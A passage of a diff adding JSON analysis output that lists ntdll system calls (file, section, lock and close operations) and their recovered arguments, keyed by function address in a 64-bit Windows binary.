+  {
+   "call_addr": 5368912866,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912903,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912918,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368913030,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368913045,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14002d2b1": [],
+ "0x14002d2d8": [],
+ "0x14002d304": [],
+ "0x14002d330": [
+  {
+   "call_addr": 5368910750,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368910811,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368910847,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910862,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910886,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910901,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910925,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910940,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140031df0": [],
+ "0x140031f60": [],
+ "0x140032220": [],
+ "0x140032300": [
+  {
+   "call_addr": 5368915020,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368915193,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": []
+  }
+ ],
+ "0x1400325e0": [
+  {
+   "call_addr": 5368916495,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetFullPathName_U",
+   "api": "RtlGetFullPathName_U",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368916622,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetFullPathName_U",
+   "api": "RtlGetFullPathName_U",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 65534,
+     "text": "0xfffe"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x1ffb0)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140032d00": [],
+ "0x140032e70": [],
+ "0x140033020": [],
+ "0x140033200": [],
+ "0x140033490": [],
+ "0x1400334af": [],
+ "0x1400334c4": [],
+ "0x140033516": [],
+ "0x14003356f": [],
+ "0x140033640": [
+  {
+   "call_addr": 5368919873,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlUpcaseUnicodeChar",
+   "api": "RtlUpcaseUnicodeChar",
+   "args": []
+  },
+  {
+   "call_addr": 5368919890,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlUpcaseUnicodeChar",
+   "api": "RtlUpcaseUnicodeChar",
+   "args": []
+  }
+ ],
+ "0x140033790": [],
+ "0x140033a50": [
+  {
+   "call_addr": 5368921328,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x90)"
+    }
+   ]
+  }
+ ],
+ "0x1400340e0": [],
+ "0x1400347c0": [
+  {
+   "call_addr": 5368924251,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryObject",
+   "api": "NtQueryObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368924561,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x10668)"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x10688)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368926339,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926364,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926387,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926438,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926554,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926623,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368926644,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x1400351f0": [],
+ "0x1400354c0": [
+  {
+   "call_addr": 5368928053,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368928136,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368928215,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368928245,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x140035820": [],
+ "0x140035830": [],
+ "0x140035840": [
+  {
+   "call_addr": 5368928737,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlSetCurrentDirectory_U",
+   "api": "RtlSetCurrentDirectory_U",
+   "args": []
+  },
+  {
+   "call_addr": 5368928826,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlSetCurrentDirectory_U",
+   "api": "RtlSetCurrentDirectory_U",
+   "args": []
+  }
+ ],
+ "0x140035b20": [
+  {
+   "call_addr": 5368929265,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlSetCurrentDirectory_U",
+   "api": "RtlSetCurrentDirectory_U",
+   "args": []
+  },
+  {
+   "call_addr": 5368929354,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlSetCurrentDirectory_U",
+   "api": "RtlSetCurrentDirectory_U",
+   "args": []
+  }
+ ],
+ "0x140035d20": [
+  {
+   "call_addr": 5368929613,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetCurrentDirectory_U",
+   "api": "RtlGetCurrentDirectory_U",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 65536,
+     "text": "0x10000"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x60)"
+    }
+   ]
+  }
+ ],
+ "0x140035f60": [],
+ "0x140036020": [],
+ "0x140036100": [],
+ "0x140036510": [],
+ "0x1400365e0": [],
+ "0x140036720": [
+  {
+   "call_addr": 5368932549,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368932583,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368932629,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140036920": [],
+ "0x1400369e0": [],
+ "0x140036a70": [],
+ "0x140036b60": [
+  {
+   "call_addr": 5368933335,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368928288,
+     "text": "0x140035820"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x7)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368933577,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368933679,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368933752,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368933989,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368934088,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368934487,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x18)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x28)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368934517,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x140037090": [
+  {
+   "call_addr": 5368934670,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368928288,
+     "text": "0x140035820"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x17)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368934859,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368934959,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368935032,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368935205,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368935304,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368935394,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": [
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x30)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368935429,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x140037420": [],
+ "0x140037530": [
+  {
+   "call_addr": 5368935768,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnmapViewOfSection",
+   "api": "NtUnmapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  }
+ ],
+ "0x1400375a0": [
+  {
+   "call_addr": 5368936182,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateSection",
+   "api": "NtCreateSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x20)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368936274,
+   "dll": "ntdll.dll",
+   "api_raw": "NtMapViewOfSection",
+   "api": "NtMapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x18)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368936359,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationVirtualMemory",
+   "api": "NtSetInformationVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    }
+   ]
+  }
+ ],
+ "0x140037980": [],
+ "0x140037990": [
+  {
+   "call_addr": 5368937021,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368937165,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368937213,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnlockFile",
+   "api": "NtUnlockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369412944,
+     "text": "0x1400abd50"
+    },
+    {
+     "name": "arg3",
+     "kind": "pointer",
+     "value": 5369412936,
+     "text": "0x1400abd48"
+    }
+   ]
+  }
+ ],
+ "0x140037b30": [
+  {
+   "call_addr": 5368937332,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnlockFile",
+   "api": "NtUnlockFile",
+   "args": []
+  }
+ ],
+ "0x140037b90": [
+  {
+   "call_addr": 5368937580,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368937684,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnlockFile",
+   "api": "NtUnlockFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368937836,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140037df0": [
+  {
+   "call_addr": 5368938205,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368938308,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnlockFile",
+   "api": "NtUnlockFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368938445,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140038030": [
+  {
+   "call_addr": 5368938615,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368939031,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 40,
+     "text": "0x28"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368939111,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 40,
+     "text": "0x28"
+    }
+   ]
+  }
+ ],
+ "0x1400382b0": [
+  {
+   "call_addr": 5368939351,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 40,
+     "text": "0x28"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368939431,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 40,
+     "text": "0x28"
+    }
+   ]
+  }
+ ],
+ "0x140038400": [
+  {
+   "call_addr": 5368939687,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368939767,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  }
+ ],
+ "0x140038590": [],
+ "0x1400386b0": [],
+ "0x140038890": [
+  {
+   "call_addr": 5368940855,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryVolumeInformationFile",
+   "api": "NtQueryVolumeInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368940951,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryVolumeInformationFile",
+   "api": "NtQueryVolumeInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368941175,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 524,
+     "text": "0x20c"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368941255,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 524,
+     "text": "0x20c"
+    }
+   ]
+  }
+ ],
+ "0x140038bb0": [],
+ "0x140038cc0": [
+  {
+   "call_addr": 5368941894,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFlushBuffersFile",
+   "api": "NtFlushBuffersFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368941958,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFlushBuffersFile",
+   "api": "NtFlushBuffersFile",
+   "args": []
+  }
+ ],
+ "0x140038e00": [
+  {
+   "call_addr": 5368942247,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368942327,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  }
+ ],
+ "0x140038f70": [
+  {
+   "call_addr": 5368942615,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368942695,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368942871,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368942951,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  }
+ ],
+ "0x1400391e0": [],
+ "0x140039270": [],
+ "0x1400393e0": [],
+ "0x140039500": [],
+ "0x1400395e0": [
+  {
+   "call_addr": 5368944286,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368928288,
+     "text": "0x140035820"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x11)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368944456,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368944554,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368944623,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368944837,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368944936,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368945124,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x28)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x38)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368945157,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x140039a50": [
+  {
+   "call_addr": 5368945267,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140039a90": [
+  {
+   "call_addr": 5368945463,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 24,
+     "text": "0x18"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368945575,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 24,
+     "text": "0x18"
+    }
+   ]
+  }
+ ],
+ "0x140039c00": [
+  {
+   "call_addr": 5368945748,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQuerySystemInformation",
+   "api": "NtQuerySystemInformation",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 64,
+     "text": "0x40"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368945959,
